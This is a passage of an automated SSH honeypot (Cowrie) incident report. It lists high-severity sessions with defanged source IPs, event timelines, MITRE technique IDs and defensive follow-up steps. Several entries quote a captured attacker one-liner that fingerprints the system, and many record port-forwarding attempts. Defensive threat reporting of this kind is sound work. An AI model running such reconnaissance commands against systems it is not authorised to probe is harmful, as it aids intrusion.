| `2026-08-29 11:43:59` | `cowrie.login.success` |
| `2026-08-29 11:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.8[.]188` to AbuseIPDB if not already reported
- [ ] Block `101.47.8[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38739a996798

| Field | Detail |
|---|---|
| **Source IP** | `101.47.8[.]188` |
| **First Seen** | 2026-08-29 11:44 |
| **Last Seen** | 2026-08-29 11:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:44:06` | `cowrie.session.connect` |
| `2026-08-29 11:44:06` | `cowrie.client.version` |
| `2026-08-29 11:44:10` | `cowrie.client.kex` |
| `2026-08-29 11:44:11` | `cowrie.login.success` |
| `2026-08-29 11:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.8[.]188` to AbuseIPDB if not already reported
- [ ] Block `101.47.8[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a45a6a46c082

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:44 |
| **Last Seen** | 2026-08-29 11:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:44:47` | `cowrie.session.connect` |
| `2026-08-29 11:44:47` | `cowrie.client.version` |
| `2026-08-29 11:44:47` | `cowrie.client.kex` |
| `2026-08-29 11:44:47` | `cowrie.login.success` |
| `2026-08-29 11:44:48` | `cowrie.session.params` |
| `2026-08-29 11:44:48` | `cowrie.command.input` |
| `2026-08-29 11:44:48` | `cowrie.command.input` |
| `2026-08-29 11:44:48` | `cowrie.command.input` |
| `2026-08-29 11:44:48` | `cowrie.command.input` |
| `2026-08-29 11:44:48` | `cowrie.command.input` |
| `2026-08-29 11:44:48` | `cowrie.command.success` |
| `2026-08-29 11:44:48` | `cowrie.command.input` |
| `2026-08-29 11:44:48` | `cowrie.command.input` |
| `2026-08-29 11:44:48` | `cowrie.command.input` |
| `2026-08-29 11:44:48` | `cowrie.command.input` |
| `2026-08-29 11:44:49` | `cowrie.log.closed` |
| `2026-08-29 11:44:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def0aafcdc5a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 11:44 |
| **Last Seen** | 2026-08-29 11:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:44:49` | `cowrie.session.connect` |
| `2026-08-29 11:44:49` | `cowrie.client.version` |
| `2026-08-29 11:44:49` | `cowrie.client.kex` |
| `2026-08-29 11:44:50` | `cowrie.login.success` |
| `2026-08-29 11:44:51` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:44:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 11:44:51` | `cowrie.direct-tcpip.data` |
| `2026-08-29 11:44:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1af2410f96c7

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:45 |
| **Last Seen** | 2026-08-29 11:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:45:54` | `cowrie.session.connect` |
| `2026-08-29 11:45:54` | `cowrie.client.version` |
| `2026-08-29 11:45:54` | `cowrie.client.kex` |
| `2026-08-29 11:45:55` | `cowrie.login.success` |
| `2026-08-29 11:45:55` | `cowrie.session.params` |
| `2026-08-29 11:45:55` | `cowrie.command.input` |
| `2026-08-29 11:45:55` | `cowrie.command.input` |
| `2026-08-29 11:45:55` | `cowrie.command.input` |
| `2026-08-29 11:45:55` | `cowrie.command.input` |
| `2026-08-29 11:45:55` | `cowrie.command.input` |
| `2026-08-29 11:45:55` | `cowrie.command.success` |
| `2026-08-29 11:45:55` | `cowrie.command.input` |
| `2026-08-29 11:45:55` | `cowrie.command.input` |
| `2026-08-29 11:45:55` | `cowrie.command.input` |
| `2026-08-29 11:45:55` | `cowrie.command.input` |
| `2026-08-29 11:45:56` | `cowrie.log.closed` |
| `2026-08-29 11:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ef63db289a4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:47 |
| **Last Seen** | 2026-08-29 11:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:47:01` | `cowrie.session.connect` |
| `2026-08-29 11:47:01` | `cowrie.client.version` |
| `2026-08-29 11:47:01` | `cowrie.client.kex` |
| `2026-08-29 11:47:01` | `cowrie.login.success` |
| `2026-08-29 11:47:02` | `cowrie.session.params` |
| `2026-08-29 11:47:02` | `cowrie.command.input` |
| `2026-08-29 11:47:02` | `cowrie.command.input` |
| `2026-08-29 11:47:02` | `cowrie.command.input` |
| `2026-08-29 11:47:02` | `cowrie.command.input` |
| `2026-08-29 11:47:02` | `cowrie.command.input` |
| `2026-08-29 11:47:02` | `cowrie.command.success` |
| `2026-08-29 11:47:02` | `cowrie.command.input` |
| `2026-08-29 11:47:02` | `cowrie.command.input` |
| `2026-08-29 11:47:02` | `cowrie.command.input` |
| `2026-08-29 11:47:02` | `cowrie.command.input` |
| `2026-08-29 11:47:02` | `cowrie.log.closed` |
| `2026-08-29 11:47:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a10850cf4dd

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:48 |
| **Last Seen** | 2026-08-29 11:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:48:09` | `cowrie.session.connect` |
| `2026-08-29 11:48:09` | `cowrie.client.version` |
| `2026-08-29 11:48:09` | `cowrie.client.kex` |
| `2026-08-29 11:48:10` | `cowrie.login.success` |
| `2026-08-29 11:48:11` | `cowrie.session.params` |
| `2026-08-29 11:48:11` | `cowrie.command.input` |
| `2026-08-29 11:48:11` | `cowrie.command.input` |
| `2026-08-29 11:48:11` | `cowrie.command.input` |
| `2026-08-29 11:48:11` | `cowrie.command.input` |
| `2026-08-29 11:48:11` | `cowrie.command.input` |
| `2026-08-29 11:48:11` | `cowrie.command.success` |
| `2026-08-29 11:48:11` | `cowrie.command.input` |
| `2026-08-29 11:48:11` | `cowrie.command.input` |
| `2026-08-29 11:48:11` | `cowrie.command.input` |
| `2026-08-29 11:48:11` | `cowrie.command.input` |
| `2026-08-29 11:48:11` | `cowrie.log.closed` |
| `2026-08-29 11:48:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb7cd973e89a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:49 |
| **Last Seen** | 2026-08-29 11:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:49:22` | `cowrie.session.connect` |
| `2026-08-29 11:49:22` | `cowrie.client.version` |
| `2026-08-29 11:49:22` | `cowrie.client.kex` |
| `2026-08-29 11:49:23` | `cowrie.login.success` |
| `2026-08-29 11:49:24` | `cowrie.session.params` |
| `2026-08-29 11:49:24` | `cowrie.command.input` |
| `2026-08-29 11:49:24` | `cowrie.command.input` |
| `2026-08-29 11:49:24` | `cowrie.command.input` |
| `2026-08-29 11:49:24` | `cowrie.command.input` |
| `2026-08-29 11:49:24` | `cowrie.command.input` |
| `2026-08-29 11:49:24` | `cowrie.command.success` |
| `2026-08-29 11:49:24` | `cowrie.command.input` |
| `2026-08-29 11:49:24` | `cowrie.command.input` |
| `2026-08-29 11:49:24` | `cowrie.command.input` |
| `2026-08-29 11:49:24` | `cowrie.command.input` |
| `2026-08-29 11:49:24` | `cowrie.log.closed` |
| `2026-08-29 11:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4d0a7577b48

| Field | Detail |
|---|---|
| **Source IP** | `61.93.135[.]225` |
| **First Seen** | 2026-08-29 11:49 |
| **Last Seen** | 2026-08-29 11:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:49:29` | `cowrie.session.connect` |
| `2026-08-29 11:49:30` | `cowrie.client.version` |
| `2026-08-29 11:49:30` | `cowrie.client.kex` |
| `2026-08-29 11:49:31` | `cowrie.login.success` |
| `2026-08-29 11:49:32` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:49:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.93.135[.]225` to AbuseIPDB if not already reported
- [ ] Block `61.93.135[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc6332bf33e1

| Field | Detail |
|---|---|
| **Source IP** | `122.176.23[.]166` |
| **First Seen** | 2026-08-29 11:49 |
| **Last Seen** | 2026-08-29 11:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:49:37` | `cowrie.session.connect` |
| `2026-08-29 11:49:38` | `cowrie.client.version` |
| `2026-08-29 11:49:38` | `cowrie.client.kex` |
| `2026-08-29 11:49:40` | `cowrie.login.success` |
| `2026-08-29 11:49:40` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:49:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.23[.]166` to AbuseIPDB if not already reported
- [ ] Block `122.176.23[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e57295aadda3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 11:50 |
| **Last Seen** | 2026-08-29 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:50:43` | `cowrie.session.connect` |
| `2026-08-29 11:50:43` | `cowrie.client.version` |
| `2026-08-29 11:50:43` | `cowrie.client.kex` |
| `2026-08-29 11:50:44` | `cowrie.login.success` |
| `2026-08-29 11:50:44` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:50:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 11:50:44` | `cowrie.direct-tcpip.data` |
| `2026-08-29 11:50:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acdd4ce7ac0c

| Field | Detail |
|---|---|
| **Source IP** | `120.234.195[.]41` |
| **First Seen** | 2026-08-29 11:52 |
| **Last Seen** | 2026-08-29 11:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:52:41` | `cowrie.session.connect` |
| `2026-08-29 11:52:42` | `cowrie.client.version` |
| `2026-08-29 11:52:42` | `cowrie.client.kex` |
| `2026-08-29 11:52:44` | `cowrie.login.success` |
| `2026-08-29 11:52:44` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.234.195[.]41` to AbuseIPDB if not already reported
- [ ] Block `120.234.195[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ced1618574af

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 11:54 |
| **Last Seen** | 2026-08-29 11:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:54:25` | `cowrie.session.connect` |
| `2026-08-29 11:54:25` | `cowrie.client.version` |
| `2026-08-29 11:54:25` | `cowrie.client.kex` |
| `2026-08-29 11:54:26` | `cowrie.login.success` |
| `2026-08-29 11:54:26` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:54:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 11:54:26` | `cowrie.direct-tcpip.data` |
| `2026-08-29 11:54:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a57fd914df

| Field | Detail |
|---|---|
| **Source IP** | `65.20.158[.]10` |
| **First Seen** | 2026-08-29 11:55 |
| **Last Seen** | 2026-08-29 11:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:55:23` | `cowrie.session.connect` |
| `2026-08-29 11:55:23` | `cowrie.client.version` |
| `2026-08-29 11:55:23` | `cowrie.client.kex` |
| `2026-08-29 11:55:24` | `cowrie.login.success` |
| `2026-08-29 11:55:24` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:55:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.158[.]10` to AbuseIPDB if not already reported
- [ ] Block `65.20.158[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8516e84efc19

| Field | Detail |
|---|---|
| **Source IP** | `179.184.85[.]167` |
| **First Seen** | 2026-08-29 11:55 |
| **Last Seen** | 2026-08-29 11:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:55:30` | `cowrie.session.connect` |
| `2026-08-29 11:55:30` | `cowrie.client.version` |
| `2026-08-29 11:55:30` | `cowrie.client.kex` |
| `2026-08-29 11:55:32` | `cowrie.login.success` |
| `2026-08-29 11:55:33` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:55:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.85[.]167` to AbuseIPDB if not already reported
- [ ] Block `179.184.85[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2e1b1ec93d9

| Field | Detail |
|---|---|
| **Source IP** | `49.206.194[.]29` |
| **First Seen** | 2026-08-29 11:55 |
| **Last Seen** | 2026-08-29 11:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:55:35` | `cowrie.session.connect` |
| `2026-08-29 11:55:35` | `cowrie.client.version` |
| `2026-08-29 11:55:35` | `cowrie.client.kex` |
| `2026-08-29 11:55:37` | `cowrie.login.success` |
| `2026-08-29 11:55:38` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.194[.]29` to AbuseIPDB if not already reported
- [ ] Block `49.206.194[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ac21043aace

| Field | Detail |
|---|---|
| **Source IP** | `213.149.216[.]10` |
| **First Seen** | 2026-08-29 11:55 |
| **Last Seen** | 2026-08-29 12:00 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:55:43` | `cowrie.session.connect` |
| `2026-08-29 11:55:43` | `cowrie.client.version` |
| `2026-08-29 11:55:43` | `cowrie.client.kex` |
| `2026-08-29 11:55:44` | `cowrie.login.success` |
| `2026-08-29 11:55:44` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.149.216[.]10` to AbuseIPDB if not already reported
- [ ] Block `213.149.216[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76b3dea0c752

| Field | Detail |
|---|---|
| **Source IP** | `36.64.211[.]93` |
| **First Seen** | 2026-08-29 11:57 |
| **Last Seen** | 2026-08-29 11:57 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:57:36` | `cowrie.session.connect` |
| `2026-08-29 11:57:36` | `cowrie.client.version` |
| `2026-08-29 11:57:36` | `cowrie.client.kex` |
| `2026-08-29 11:57:45` | `cowrie.login.success` |
| `2026-08-29 11:57:47` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:57:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.211[.]93` to AbuseIPDB if not already reported
- [ ] Block `36.64.211[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db2c3ac0edc4

| Field | Detail |
|---|---|
| **Source IP** | `95.79.57[.]221` |
| **First Seen** | 2026-08-29 11:57 |
| **Last Seen** | 2026-08-29 11:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:57:53` | `cowrie.session.connect` |
| `2026-08-29 11:57:53` | `cowrie.client.version` |
| `2026-08-29 11:57:53` | `cowrie.client.kex` |
| `2026-08-29 11:57:55` | `cowrie.login.success` |
| `2026-08-29 11:57:55` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.79.57[.]221` to AbuseIPDB if not already reported
- [ ] Block `95.79.57[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61bcd7996f1e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 12:01 |
| **Last Seen** | 2026-08-29 12:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:01:21` | `cowrie.session.connect` |
| `2026-08-29 12:01:21` | `cowrie.client.version` |
| `2026-08-29 12:01:21` | `cowrie.client.kex` |
| `2026-08-29 12:01:22` | `cowrie.login.success` |
| `2026-08-29 12:01:22` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:01:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 12:01:22` | `cowrie.direct-tcpip.data` |
| `2026-08-29 12:01:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-387a5dceff47

| Field | Detail |
|---|---|
| **Source IP** | `135.125.235[.]107` |
| **First Seen** | 2026-08-29 12:01 |
| **Last Seen** | 2026-08-29 12:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
